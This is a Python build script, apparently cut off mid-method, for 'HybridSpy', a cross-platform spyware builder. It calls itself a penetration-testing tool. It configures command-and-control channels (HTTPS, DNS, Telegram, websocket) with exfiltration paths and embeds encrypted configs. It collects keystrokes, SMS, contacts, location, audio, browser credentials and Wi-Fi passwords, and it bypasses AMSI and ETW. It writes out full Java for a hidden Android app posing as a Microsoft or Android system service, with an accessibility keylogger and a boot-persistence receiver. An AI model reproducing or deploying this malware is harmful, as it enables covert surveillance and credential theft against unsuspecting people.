#!/usr/bin/env python3
"""
HybridSpy Builder v2.1.0 — Elite Grade
Cross-platform payload builder for authorized penetration testing.
Idempotent, scalable, parallelized, production-grade.
"""
import argparse
import asyncio
import concurrent.futures
import hashlib
import json
import logging
import os
import secrets
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from xml.etree import ElementTree as ET

import yaml
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ─── Constants ───────────────────────────────────────────────────────────────

PROJECT_ROOT = Path(__file__).resolve().parent.parent
BUILDER_DIR = Path(__file__).resolve().parent
MODULES_DIR = BUILDER_DIR / "modules"
RESOURCES_DIR = BUILDER_DIR / "resources"
OUTPUT_DIR = BUILDER_DIR / "output"
PAYLOAD_DIR = PROJECT_ROOT / "Payload"
TEMPLATES_DIR = RESOURCES_DIR / "templates"
CACHE_DIR = BUILDER_DIR / ".build_cache"
BUILD_METADATA_DIR = BUILDER_DIR / ".build_metadata"

# ─── Logging ─────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("HybridSpy.Builder")


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class BuildConfig:
    """Parsed and validated build configuration."""
    system_name: str = "HybridSpy"
    system_version: str = "2.1.0"
    
    # C2
    c2_primary: str = "https"
    c2_backup_channels: List[str] = field(default_factory=lambda: ["dns", "telegram", "websocket"])
    c2_https_worker: str = ""
    c2_https_beacon: str = "/v3/collect"
    c2_https_exfil: str = "/v3/upload"
    c2_https_poll: str = "/v3/tasks"
    c2_dns_domain: str = ""
    c2_telegram_token: str = ""
    c2_telegram_chat: str = ""
    c2_ws_server: str = ""
    
    # Encryption
    master_key: bytes = field(default_factory=lambda: AESGCM.generate_key(bit_length=256))
    pbkdf2_iterations: int = 600000
    
    # Android
    android_package: str = "com.android.system.security"
    android_app_name: str = "System Security Service"
    android_min_sdk: int = 26
    android_target_sdk: int = 33
    android_icon: str = ""
    
    # Windows
    windows_binary: str = "RuntimeBroker.exe"
    windows_internal: str = "WindowsRuntimeManager"
    windows_description: str = "Microsoft Windows Runtime Manager"
    windows_company: str = "Microsoft Corporation"
    windows_icon: str = ""
    
    # Features - Android
    android_keylogger: bool = True
    android_sms: bool = True
    android_contacts: bool = True
    android_call_logs: bool = True
    android_location: bool = True
    android_mic: bool = True
    android_camera: bool = False
    android_browser: bool = True
    android_device_info: bool = True
    android_clipboard: bool = True
    
    # Features - Windows
    windows_keylogger: bool = True
    windows_browser_creds: bool = True
    windows_wifi: bool = True
    windows_doc_scanner: bool = True
    windows_screenshots: bool = True
    windows_mic: bool = True
    windows_webcam: bool = False
    windows_clipboard: bool = True
    windows_cred_manager: bool = True
    windows_system_info: bool = True
    
    # Stealth
    hide_launcher: bool = True
    silent_notification: bool = True
    sandbox_evasion: bool = True
    amsi_bypass: bool = True
    etw_bypass: bool = True
    process_masquerade: str = "svchost.exe"
    
    # Persistence
    android_boot: bool = True
    android_foreground: bool = True
    windows_registry: bool = True
    windows_task: bool = True
    
    # Beacon
    beacon_interval: int = 180
    beacon_jitter: int = 120
    offline_buffer: int = 1000
    retry_attempts: int = 3
    
    # Build
    target: str = "hybrid"
    output_dir: Path = OUTPUT_DIR
    cache_enabled: bool = True
    parallel: bool = True
    verbose: bool = False
    
    @classmethod
    def from_yaml(cls, path: Path, overrides: Optional[Dict] = None) -> "BuildConfig":
        """Load config from YAML with optional CLI overrides."""
        with open(path, "r") as f:
            raw = yaml.safe_load(f)
        
        cfg = cls()
        
        # System
        cfg.system_name = raw.get("system", {}).get("name", cfg.system_name)
        cfg.system_version = raw.get("system", {}).get("version", cfg.system_version)
        
        # C2
        c2 = raw.get("c2", {})
        cfg.c2_primary = c2.get("primary_channel", cfg.c2_primary)
        cfg.c2_backup_channels = c2.get("backup_channels", cfg.c2_backup_channels)
        https = c2.get("https", {})
        cfg.c2_https_worker = https.get("worker_url", "")
        cfg.c2_https_beacon = https.get("beacon_path", cfg.c2_https_beacon)
        cfg.c2_https_exfil = https.get("exfil_path", cfg.c2_https_exfil)
        cfg.c2_https_poll = https.get("poll_path", cfg.c2_https_poll)
        dns = c2.get("dns", {})
        cfg.c2_dns_domain = dns.get("domain", "")
        tg = c2.get("telegram", {})
        cfg.c2_telegram_token = tg.get("bot_token", "")
        cfg.c2_telegram_chat = tg.get("chat_id", "")
        ws = c2.get("websocket", {})
        cfg.c2_ws_server = ws.get("server", "")
        
        # Encryption
        enc = raw.get("encryption", {})
        key_hex = enc.get("master_key", "")
        if key_hex:
            cfg.master_key = bytes.fromhex(key_hex)
        cfg.pbkdf2_iterations = enc.get("pbkdf2_iterations", cfg.pbkdf2_iterations)
        
        # Payload names
        p = raw.get("payload", {})
        a = p.get("android", {})
        cfg.android_package = a.get("package_name", cfg.android_package)
        cfg.android_app_name = a.get("app_name", cfg.android_app_name)
        cfg.android_min_sdk = a.get("min_sdk", cfg.android_min_sdk)
        cfg.android_target_sdk = a.get("target_sdk", cfg.android_target_sdk)
        cfg.android_icon = str(RESOURCES_DIR / a.get("icon", "icons/android_icon.png"))
        
        w = p.get("windows", {})
        cfg.windows_binary = w.get("binary_name", cfg.windows_binary)
        cfg.windows_internal = w.get("internal_name", cfg.windows_internal)
        cfg.windows_description = w.get("description", cfg.windows_description)
        cfg.windows_company = w.get("company", cfg.windows_company)
        cfg.windows_icon = str(RESOURCES_DIR / w.get("icon", "icons/windows_icon.ico"))
        
        # Features
        feats = raw.get("features", {})
        af = feats.get("android", {})
        cfg.android_keylogger = af.get("keylogger", {}).get("enabled", cfg.android_keylogger)
        cfg.android_sms = af.get("sms", {}).get("enabled", cfg.android_sms)
        cfg.android_contacts = af.get("contacts", {}).get("enabled", cfg.android_contacts)
        cfg.android_call_logs = af.get("call_logs", {}).get("enabled", cfg.android_call_logs)
        cfg.android_location = af.get("location", {}).get("enabled", cfg.android_location)
        cfg.android_mic = af.get("microphone", {}).get("enabled", cfg.android_mic)
        cfg.android_camera = af.get("camera", {}).get("enabled", cfg.android_camera)
        cfg.android_browser = af.get("browser_data", {}).get("enabled", cfg.android_browser)
        cfg.android_device_info = af.get("device_info", {}).get("enabled", cfg.android_device_info)
        cfg.android_clipboard = af.get("clipboard", {}).get("enabled", cfg.android_clipboard)
        
        wf = feats.get("windows", {})
        cfg.windows_keylogger = wf.get("keylogger", {}).get("enabled", cfg.windows_keylogger)
        cfg.windows_browser_creds = wf.get("browser_credentials", {}).get("enabled", cfg.windows_browser_creds)
        cfg.windows_wifi = wf.get("wifi_passwords", {}).get("enabled", cfg.windows_wifi)
        cfg.windows_doc_scanner = wf.get("document_scanner", {}).get("enabled", cfg.windows_doc_scanner)
        cfg.windows_screenshots = wf.get("screenshots", {}).get("enabled", cfg.windows_screenshots)
        cfg.windows_mic = wf.get("microphone", {}).get("enabled", cfg.windows_mic)
        cfg.windows_webcam = wf.get("webcam", {}).get("enabled", cfg.windows_webcam)
        cfg.windows_clipboard = wf.get("clipboard", {}).get("enabled", cfg.windows_clipboard)
        cfg.windows_cred_manager = wf.get("credential_manager", {}).get("enabled", cfg.windows_cred_manager)
        cfg.windows_system_info = wf.get("system_info", {}).get("enabled", cfg.windows_system_info)
        
        # Stealth
        s = raw.get("stealth", {})
        sa = s.get("android", {})
        cfg.hide_launcher = sa.get("hide_launcher_icon", cfg.hide_launcher)
        cfg.silent_notification = sa.get("silent_notification", cfg.silent_notification)
        cfg.sandbox_evasion = sa.get("sandbox_evasion", cfg.sandbox_evasion)
        sw = s.get("windows", {})
        cfg.process_masquerade = sw.get("process_masquerade", cfg.process_masquerade)
        cfg.amsi_bypass = sw.get("amsi_bypass", cfg.amsi_bypass)
        cfg.etw_bypass = sw.get("etw_bypass", cfg.etw_bypass)
        
        # Persistence
        pers = raw.get("persistence", {})
        pa = pers.get("android", {})
        cfg.android_boot = pa.get("boot_receiver", cfg.android_boot)
        cfg.android_foreground = pa.get("foreground_service", cfg.android_foreground)
        pw = pers.get("windows", {})
        cfg.windows_registry = pw.get("registry_run", cfg.windows_registry)
        cfg.windows_task = pw.get("scheduled_task", cfg.windows_task)
        
        # Beacon
        b = raw.get("beacon", {})
        cfg.beacon_interval = b.get("interval_base", cfg.beacon_interval)
        cfg.beacon_jitter = b.get("jitter_max", cfg.beacon_jitter)
        cfg.offline_buffer = b.get("offline_buffer_size", cfg.offline_buffer)
        cfg.retry_attempts = b.get("retry_attempts", cfg.retry_attempts)
        
        # CLI overrides
        if overrides:
            for k, v in overrides.items():
                if hasattr(cfg, k) and v is not None:
                    setattr(cfg, k, v)
        
        return cfg


@dataclass
class BuildResult:
    """Result of a build operation."""
    success: bool
    target: str
    output_paths: List[Path] = field(default_factory=list)
    checksums: Dict[str, str] = field(default_factory=dict)
    build_time: float = 0.0
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


# ─── Crypto Utilities ────────────────────────────────────────────────────────

class CryptoEngine:
    """Handles encryption for config embedding and payload protection."""
    
    @staticmethod
    def generate_key() -> bytes:
        return AESGCM.generate_key(bit_length=256)
    
    @staticmethod
    def encrypt(plaintext: bytes, key: bytes) -> bytes:
        aesgcm = AESGCM(key)
        nonce = secrets.token_bytes(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ciphertext
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        aesgcm = AESGCM(key)
        nonce, ciphertext = data[:12], data[12:]
        return aesgcm.decrypt(nonce, ciphertext, None)
    
    @staticmethod
    def derive_key(master_key: bytes, salt: bytes, iterations: int = 600000) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
        )
        return kdf.derive(master_key)
    
    @staticmethod
    def hash_file(path: Path) -> str:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()


# ─── Module Manager ──────────────────────────────────────────────────────────

class ModuleManager:
    """Discovers, validates, and selects modules for injection."""
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.modules_dir = MODULES_DIR
        self._module_cache: Dict[str, Dict] = {}
        
    def discover_modules(self) -> Dict[str, Dict]:
        """Discover all available modules with metadata."""
        if self._module_cache:
            return self._module_cache
            
        modules = {
            "android": {},
            "windows": {},
            "shared": {},
        }
        
        for platform in ["android", "windows", "shared"]:
            platform_dir = self.modules_dir / platform
            if not platform_dir.exists():
                continue
                
            for category_dir in platform_dir.iterdir():
                if not category_dir.is_dir():
                    continue
                for module_file in category_dir.glob("*.py"):
                    mod_name = module_file.stem
                    mod_path = module_file
                    rel_path = mod_path.relative_to(self.modules_dir)
                    
                    modules[platform][mod_name] = {
                        "path": mod_path,
                        "platform": platform,
                        "category": category_dir.name,
                        "name": mod_name,
                        "rel_path": str(rel_path),
                        "size": mod_path.stat().st_size,
                        "mtime": mod_path.stat().st_mtime,
                    }
        
        self._module_cache = modules
        return modules
    
    def get_selected_modules(self, target: str) -> Dict[str, List[Dict]]:
        """Get list of modules to include based on config + target."""
        all_mods = self.discover_modules()
        selected = {
            "android": [],
            "windows": [],
            "shared": [],
        }
        
        # Always include shared modules
        selected["shared"] = list(all_mods.get("shared", {}).values())
        
        if target in ("android", "hybrid"):
            selected["android"] = self._filter_android_modules(all_mods.get("android", {}))
        
        if target in ("windows", "hybrid"):
            selected["windows"] = self._filter_windows_modules(all_mods.get("windows", {}))
        
        return selected
    
    def _filter_android_modules(self, modules: Dict) -> List[Dict]:
        """Filter Android modules based on feature flags."""
        feature_map = {
            "sms_collector": "android_sms",
            "contacts_collector": "android_contacts",
            "call_log_collector": "android_call_logs",
            "location_collector": "android_location",
            "browser_data": "android_browser",
            "device_info": "android_device_info",
            "microphone": "android_mic",
            "camera": "android_camera",
            "clipboard": "android_clipboard",
            "accessibility_keylogger": "android_keylogger",
            "boot_receiver": "android_boot",
            "foreground_service": "android_foreground",
            "alarm_manager": "android_foreground",
            "icon_hider": "hide_launcher",
            "notification_suppressor": "silent_notification",
            "sandbox_evasion": "sandbox_evasion",
        }
        return self._filter_by_features(modules, feature_map)
    
    def _filter_windows_modules(self, modules: Dict) -> List[Dict]:
        """Filter Windows modules based on feature flags."""
        feature_map = {
            "browser_credentials": "windows_browser_creds",
            "wifi_passwords": "windows_wifi",
            "document_scanner": "windows_doc_scanner",
            "system_info": "windows_system_info",
            "credential_manager": "windows_cred_manager",
            "microphone": "windows_mic",
            "webcam": "windows_webcam",
            "screenshot": "windows_screenshots",
            "clipboard_monitor": "windows_clipboard",
            "userland_keylogger": "windows_keylogger",
            "registry_run": "windows_registry",
            "scheduled_task": "windows_task",
            "process_masquerade": None,  # Always included when selected
            "amsi_bypass": "amsi_bypass",
            "etw_bypass": "etw_bypass",
            "sandbox_evasion": "sandbox_evasion",
        }
        return self._filter_by_features(modules, feature_map)
    
    def _filter_by_features(self, modules: Dict, feature_map: Dict) -> List[Dict]:
        """Filter modules by feature flags with proper dependency resolution."""
        result = []
        for mod_name, mod_data in modules.items():
            feature_attr = feature_map.get(mod_name)
            if feature_attr is None:
                # Always include (no feature gate)
                result.append(mod_data)
            elif getattr(self.config, feature_attr, False):
                result.append(mod_data)
            else:
                log.debug(f"Skipping module {mod_name} (feature disabled)")
        return result


# ─── Config Embedder ─────────────────────────────────────────────────────────

class ConfigEmbedder:
    """Encrypts and embeds configuration into payload."""
    
    def __init__(self, config: BuildConfig):
        self.config = config
        
    def build_embedded_config(self) -> bytes:
        """Build the runtime configuration blob (encrypted JSON)."""
        config_dict = {
            "v": self.config.system_version,
            "c2": {
                "p": self.config.c2_primary,
                "b": self.config.c2_backup_channels,
                "h": {
                    "u": self.config.c2_https_worker,
                    "b": self.config.c2_https_beacon,
                    "e": self.config.c2_https_exfil,
                    "p": self.config.c2_https_poll,
                },
                "d": {"d": self.config.c2_dns_domain},
                "t": {"t": self.config.c2_telegram_token, "c": self.config.c2_telegram_chat},
                "w": {"s": self.config.c2_ws_server},
            },
            "enc": {
                "i": self.config.pbkdf2_iterations,
            },
            "beacon": {
                "i": self.config.beacon_interval,
                "j": self.config.beacon_jitter,
                "b": self.config.offline_buffer,
                "r": self.config.retry_attempts,
            },
            "stealth": {
                "s_e": self.config.sandbox_evasion,
                "pm": self.config.process_masquerade,
            },
            "feats": {
                "a_k": self.config.android_keylogger,
                "a_l": self.config.android_location,
                "a_m": self.config.android_mic,
                "a_c": self.config.android_clipboard,
                "w_k": self.config.windows_keylogger,
                "w_b": self.config.windows_browser_creds,
                "w_s": self.config.windows_screenshots,
                "w_m": self.config.windows_mic,
                "w_c": self.config.windows_clipboard,
            }
        }
        
        payload = json.dumps(config_dict, separators=(",", ":")).encode("utf-8")
        
        # Generate config-specific salt and encrypt
        salt = secrets.token_bytes(16)
        config_key = CryptoEngine.derive_key(
            self.config.master_key, salt, self.config.pbkdf2_iterations
        )
        encrypted = CryptoEngine.encrypt(payload, config_key)
        
        # Format: [4-byte salt_len][salt][encrypted_data]
        salt_len = len(salt).to_bytes(4, "big")
        return salt_len + salt + encrypted
    
    def extract_embedded_config(self, data: bytes) -> Dict:
        """Extract and decrypt embedded config (for testing)."""
        salt_len = int.from_bytes(data[:4], "big")
        salt = data[4:4 + salt_len]
        encrypted = data[4 + salt_len:]
        config_key = CryptoEngine.derive_key(
            self.config.master_key, salt, self.config.pbkdf2_iterations
        )
        decrypted = CryptoEngine.decrypt(encrypted, config_key)
        return json.loads(decrypted.decode("utf-8"))


# ─── Build Context / Cache ───────────────────────────────────────────────────

class BuildCache:
    """Idempotent build cache — skips rebuild if inputs haven't changed."""
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.cache_dir = CACHE_DIR
        self.metadata_dir = BUILD_METADATA_DIR
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.metadata_dir.mkdir(parents=True, exist_ok=True)
        
    def get_cache_key(self, target: str, modules: List[Path]) -> str:
        """Generate a deterministic cache key from config + module contents."""
        h = hashlib.sha256()
        
        # Config hash
        config_bytes = json.dumps(self._config_to_dict(), sort_keys=True).encode()
        h.update(config_bytes)
        
        # Module content hashes
        for mod_path in sorted(modules):
            if mod_path.exists():
                with open(mod_path, "rb") as f:
                    h.update(f.read())
            h.update(str(mod_path).encode())
        
        # Template hashes
        templates_dir = TEMPLATES_DIR
        if templates_dir.exists():
            for tpl in sorted(templates_dir.iterdir()):
                if tpl.is_file():
                    with open(tpl, "rb") as f:
                        h.update(f.read())
        
        return h.hexdigest()
    
    def is_cached(self, target: str, cache_key: str) -> bool:
        """Check if a build is already cached."""
        if not self.config.cache_enabled:
            return False
        metadata_file = self.metadata_dir / f"{target}_build.json"
        if not metadata_file.exists():
            return False
        try:
            with open(metadata_file) as f:
                meta = json.load(f)
            return meta.get("cache_key") == cache_key and meta.get("success", False)
        except (json.JSONDecodeError, KeyError):
            return False
    
    def save_metadata(self, target: str, cache_key: str, result: BuildResult):
        """Save build metadata for cache validation."""
        metadata = {
            "cache_key": cache_key,
            "success": result.success,
            "build_time": result.build_time,
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "outputs": [str(p) for p in result.output_paths],
            "checksums": result.checksums,
            "errors": result.errors,
            "warnings": result.warnings,
        }
        metadata_file = self.metadata_dir / f"{target}_build.json"
        with open(metadata_file, "w") as f:
            json.dump(metadata, f, indent=2)
    
    def _config_to_dict(self) -> Dict:
        """Serialize config to dict for hashing (exclude binary key)."""
        d = self.config.__dict__.copy()
        d["master_key"] = self.config.master_key.hex()
        d["output_dir"] = str(d["output_dir"])
        return d


# ─── Payload Assembler ───────────────────────────────────────────────────────

class PayloadAssembler:
    """Assembles payload source from template + selected modules."""
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.module_mgr = ModuleManager(config)
        self.config_embedder = ConfigEmbedder(config)
        
    def assemble_android(self, build_dir: Path) -> List[Path]:
        """Assemble Android payload in build directory."""
        log.info("Assembling Android payload...")
        
        # Get selected modules
        modules = self.module_mgr.get_selected_modules("android")
        
        # Create Android source structure
        src_dir = build_dir / "android" / "app" / "src" / "main"
        java_dir = src_dir / "java" / "com" / "android" / "system" / "security"
        res_dir = src_dir / "res"
        python_dir = src_dir / "python"
        
        for d in [java_dir, res_dir / "values", res_dir / "drawable", res_dir / "xml", 
                  python_dir, python_dir / "c2", python_dir / "data", python_dir / "utils"]:
            d.mkdir(parents=True, exist_ok=True)
        
        # Generate AndroidManifest.xml
        self._generate_android_manifest(src_dir)
        
        # Generate Java sources
        self._generate_main_activity(java_dir)
        self._generate_foreground_service(java_dir)
        self._generate_boot_receiver(java_dir)
        self._generate_accessibility_service(java_dir, res_dir)
        
        # Copy and assemble Python modules
        self._assemble_python_modules(modules, python_dir)
        
        # Embed encrypted config
        config_blob = self.config_embedder.build_embedded_config()
        config_out = python_dir / "_config.bin"
        with open(config_out, "wb") as f:
            f.write(config_blob)
        
        # Copy icon
        if self.config.android_icon:
            icon_path = Path(self.config.android_icon)
            if icon_path.exists():
                shutil.copy2(icon_path, res_dir / "drawable" / "ic_launcher.png")
        
        files = list(src_dir.rglob("*"))
        log.info(f"Assembled {len(files)} Android source files")
        return files
    
    def assemble_windows(self, build_dir: Path) -> List[Path]:
        """Assemble Windows payload in build directory."""
        log.info("Assembling Windows payload...")
        
        modules = self.module_mgr.get_selected_modules("windows")
        
        src_dir = build_dir / "windows"
        payload_dir = src_dir / "payload"
        
        for d in [payload_dir, payload_dir / "c2", payload_dir / "data", payload_dir / "utils"]:
            d.mkdir(parents=True, exist_ok=True)
        
        # Generate main.py (entry point)
        self._generate_windows_entry(payload_dir)
        
        # Generate Windows service wrapper
        self._generate_windows_service(payload_dir)
        
        # Copy and assemble Python modules
        self._assemble_python_modules(modules, payload_dir)
        
        # Embed encrypted config
        config_blob = self.config_embedder.build_embedded_config()
        config_out = payload_dir / "_config.bin"
        with open(config_out, "wb") as f:
            f.write(config_blob)
        
        # Generate PyInstaller spec
        self._generate_pyinstaller_spec(src_dir, payload_dir)
        
        files = list(src_dir.rglob("*"))
        log.info(f"Assembled {len(files)} Windows source files")
        return files
    
    def _assemble_python_modules(self, modules: Dict[str, List[Dict]], target_dir: Path):
        """Copy selected Python modules to the target directory."""
        modules_copied = 0
        for platform, mods in modules.items():
            for mod in mods:
                src = mod["path"]
                rel = Path(mod["rel_path"])
                
                # Preserve directory structure
                if rel.parent.name == "shared":
                    dst = target_dir / rel.name
                elif rel.parent.name == "keylogger":
                    dst = target_dir / "utils" / rel.name
                elif rel.parent.name == "collectors":
                    # Flatten collectors into target root
                    dst = target_dir / rel.name
                else:
                    dst = target_dir / rel.name
                
                shutil.copy2(src, dst)
                modules_copied += 1
        
        # Copy hybrid core modules
        payload_core_files = [
            PAYLOAD_DIR / "hybrid_core.py",
            PAYLOAD_DIR / "platform_selector.py",
            PAYLOAD_DIR / "config_loader.py",
        ]
        for f in payload_core_files:
            if f.exists():
                shutil.copy2(f, target_dir / f.name)
                modules_copied += 1
        
        log.info(f"Copied {modules_copied} Python modules")
    
    def _generate_android_manifest(self, src_dir: Path):
        """Generate AndroidManifest.xml with requested permissions."""
        permissions = []
        
        if self.config.android_sms:
            permissions.extend([
                "android.permission.READ_SMS",
                "android.permission.RECEIVE_SMS",
            ])
        if self.config.android_contacts:
            permissions.append("android.permission.READ_CONTACTS")
        if self.config.android_call_logs:
            permissions.append("android.permission.READ_CALL_LOG")
        if self.config.android_location:
            permissions.extend([
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.ACCESS_COARSE_LOCATION",
                "android.permission.ACCESS_BACKGROUND_LOCATION",
            ])
        if self.config.android_mic:
            permissions.append("android.permission.RECORD_AUDIO")
        if self.config.android_camera:
            permissions.append("android.permission.CAMERA")
        if self.config.android_boot:
            permissions.append("android.permission.RECEIVE_BOOT_COMPLETED")
        
        permissions.extend([
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.WAKE_LOCK",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
        ])
        
        manifest = ET.Element("manifest", {
            "xmlns:android": "http://schemas.android.com/apk/res/android",
            "package": self.config.android_package,
        })
        
        for perm in permissions:
            ET.SubElement(manifest, "uses-permission", {
                "android:name": perm
            })
        
        application = ET.SubElement(manifest, "application", {
            "android:allowBackup": "false",
            "android:icon": "@drawable/ic_launcher",
            "android:label": self.config.android_app_name,
            "android:supportsRtl": "true",
            "android:theme": "@android:style/Theme.Material.NoActionBar",
        })
        
        # Main activity
        activity = ET.SubElement(application, "activity", {
            "android:name": ".MainActivity",
            "android:excludeFromRecents": "true" if self.config.hide_launcher else "false",
        })
        
        if self.config.hide_launcher:
            # No LAUNCHER category — app won't appear in app drawer
            intent_filter = ET.SubElement(activity, "intent-filter")
            ET.SubElement(intent_filter, "action", {
                "android:name": "android.intent.action.MAIN"
            })
        else:
            intent_filter = ET.SubElement(activity, "intent-filter")
            ET.SubElement(intent_filter, "action", {
                "android:name": "android.intent.action.MAIN"
            })
            ET.SubElement(intent_filter, "category", {
                "android:name": "android.intent.category.LAUNCHER"
            })
        
        # Foreground service
        service = ET.SubElement(application, "service", {
            "android:name": ".SystemSecurityService",
            "android:enabled": "true",
            "android:exported": "false",
            "android:foregroundServiceType": "dataSync",
        })
        
        # Boot receiver
        if self.config.android_boot:
            receiver = ET.SubElement(application, "receiver", {
                "android:name": ".BootReceiver",
                "android:enabled": "true",
                "android:exported": "true",
            })
            intent_filter = ET.SubElement(receiver, "intent-filter")
            ET.SubElement(intent_filter, "action", {
                "android:name": "android.intent.action.BOOT_COMPLETED"
            })
            ET.SubElement(intent_filter, "action", {
                "android:name": "android.intent.action.QUICKBOOT_POWERON"
            })
        
        # Accessibility service
        service = ET.SubElement(application, "service", {
            "android:name": ".KeyloggerAccessibilityService",
            "android:enabled": "true",
            "android:exported": "true",
            "android:permission": "android.permission.BIND_ACCESSIBILITY_SERVICE",
        })
        intent_filter = ET.SubElement(service, "intent-filter")
        ET.SubElement(intent_filter, "action", {
            "android:name": "android.accessibilityservice.AccessibilityService"
        })
        meta = ET.SubElement(service, "meta-data", {
            "android:name": "android.accessibilityservice",
            "android:resource": "@xml/accessibility_service_config",
        })
        
        tree = ET.ElementTree(manifest)
        tree.write(src_dir / "AndroidManifest.xml", xml_declaration=True, encoding="utf-8")
    
    def _generate_main_activity(self, java_dir: Path):
        """Generate MainActivity.java."""
        code = '''package com.android.system.security;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Stealth: transparent window, no UI
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            getWindow().setAttributes(new WindowManager.LayoutParams(
                0, 0, 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE 
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSPARENT
            ));
        }
        
        // Show briefly then move to background
        finishAndRemoveTask();
        
        // Start foreground service
        Intent serviceIntent = new Intent(this, SystemSecurityService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Request battery optimization bypass
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent powerIntent = new Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                android.net.Uri.parse("package:" + getPackageName())
            );
            startActivity(powerIntent);
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        android.os.Process.killProcess(android.os.Process.myPid());
    }
}
'''
        with open(java_dir / "MainActivity.java", "w") as f:
            f.write(code)
    
    def _generate_foreground_service(self, java_dir: Path):
        """Generate SystemSecurityService.java."""
        code = '''package com.android.system.security;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class SystemSecurityService extends Service {
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "system_security_channel";
    
    private PythonBridge pythonBridge;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security")
            .setContentText("Keeping your device secure")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
        
        startForeground(NOTIFICATION_ID, notification);
        
        // Initialize Python runtime and start payload
        pythonBridge = new PythonBridge(this);
        pythonBridge.start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        if (pythonBridge != null) {
            pythonBridge.stop();
        }
        super.onDestroy();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Security Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
'''
        with open(java_dir / "SystemSecurityService.java", "w") as f:
            f.write(code)
    
    def _generate_boot_receiver(self, java_dir: Path):
        """Generate BootReceiver.java."""
        code = '''package com.android.system.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) 
            || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Intent serviceIntent = new Intent(context, SystemSecurityService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
'''
        with open(java_dir / "BootReceiver.java", "w") as f:
            f.write(code)
    
    def _generate_accessibility_service(self, java_dir: Path, res_dir: Path):
        """Generate AccessibilityService and config."""
        # Accessibility service Java
        code = '''package com.android.system.security;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyloggerAccessibilityService extends AccessibilityService {
    private PythonBridge pythonBridge;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (pythonBridge == null) {
            pythonBridge = new PythonBridge(this);
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText();
            if (text != null && text.length() > 0) {
                pythonBridge.onKeyEvent(text.toString());
            }
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
